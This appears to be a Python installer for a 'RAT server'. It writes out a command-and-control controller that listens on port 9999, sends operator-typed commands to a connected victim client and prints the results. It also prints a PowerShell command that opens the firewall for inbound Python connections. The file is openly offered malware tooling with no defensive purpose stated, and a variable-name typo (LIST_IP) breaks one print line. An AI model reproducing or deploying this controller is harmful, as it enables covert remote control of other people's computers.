import os
import sys
import subprocess
import shutil
import platform

SERVER_CODE = """import socket
import sys
import os

LISTEN_IP = '0.0.0.0'
PORT = 9999

def main():
    if os.name == 'nt':
        print("[!] Warning: Running on Windows. Firewall may block incoming connections.")
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((LISTEN_IP, PORT))
        server.listen(1)
        print(f"[*] Listening on {LIST_IP}:{PORT}")
        print("[*] Waiting for connection...")
    except Exception as e:
        print(f"[!] Failed to bind: {e}")
        print("[!] Ensure no other program is using port 9999 and check firewall settings.")
        sys.exit(1)

    client, addr = server.accept()
    print(f"[+] Connection received from {addr}")

    while True:
        try:
            cmd = input("# ")
            if cmd.lower() == 'exit':
                client.send('exit'.encode())
                break
            
            client.send(cmd.encode())
            
            if cmd.lower() == 'exit':
                break
                
            result = client.recv(4096)
            if result:
                print(result.decode())
            else:
                print("[!] Connection closed by remote host.")
                break
        except Exception as e:
            print(f"[!] Error: {e}")
            break

    client.close()
    server.close()

if __name__ == "__main__":
    main()
"""

def main():
    print("[*] RAT Server Installer")
    print("[*] Checking for Python...")
    
    if not shutil.which("python3") and not shutil.which("python"):
        print("[-] Error: Python is not installed or not in PATH.")
        sys.exit(1)
        
    python_cmd = "python3" if shutil.which("python3") else "python"
    
    script_name = "control_panel.py"
    script_path = os.path.join(os.getcwd(), script_name)
    
    print(f"[*] Creating {script_name}...")
    with open(script_path, "w") as f:
        f.write(SERVER_CODE)
        
    print(f"[+] Created {script_path}")
    print(f"\n[!] To run the server: {python_cmd} {script_path}")
    print("[!] Ensure your firewall allows incoming connections on port 9999.")
    
    if platform.system() == "Windows":
        print("\n[!] Windows Users: You may need to create a firewall exception manually.")
        print("    Run this in PowerShell as Administrator to allow Python:")
        print(f'    New-NetFirewallRule -DisplayName "AllowPython" -Direction Inbound -Action Allow -Program "{shutil.which(python_cmd).strip()}"')

if __name__ == "__main__":
    main()
